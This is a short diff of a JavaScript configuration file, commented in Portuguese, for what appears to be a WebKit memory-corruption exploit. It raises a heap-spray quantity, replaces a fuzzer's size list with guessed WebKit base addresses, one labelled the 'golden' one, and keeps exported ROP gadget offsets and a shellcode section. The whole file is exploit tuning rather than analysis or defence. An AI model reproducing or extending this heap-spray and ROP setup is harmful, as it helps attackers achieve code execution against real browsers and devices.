@@ -1,23 +1,18 @@
 export const CONFIG = {
-    // Limite de segurança (Mantido)
-    WORKER_LIMIT: 402,
+    WORKER_LIMIT: 403,
+    SPRAY_QUANTITY: 20000, // Spray massivo para cobrir endereços
     
-    // Quantidade de sprays (Aumentamos para garantir cobertura no Butterfly Heap)
-    SPRAY_QUANTITY: 15000,
-
-    // Tamanhos para o Fuzzer
-    // Arrays nativos têm headers de 16 bytes.
-    // Testamos tamanhos alinhados e levemente desalinhados.
-    SIZES_TO_TEST: [
-        0x90, 0xA0, 0xB0, // Pequenos
-        0x100, 0x120, 0x140, 
-        0x200, 0x220, 0x240,
-        0x400, 0x420, // Médios (Favoritos)
-        0x800, 0x820,
-        0x1000, 0x2000, 0x4000
+    // Bases prováveis do WebKit (Estatística)
+    // O script vai tentar criar um objeto que funcione para QUALQUER uma dessas
+    TARGET_BASES: [
+        0x800000000n, 
+        0x801000000n,
+        0x808000000n,
+        0x820000000n, // O seu "Golden"
+        0x83e000000n,
+        0x900000000n
     ]
 };
-
 // Mantenha os GADGETS e SHELLCODE iguais...
 export const GADGETS = {
     pop_rdi: 0x2FEB5n,
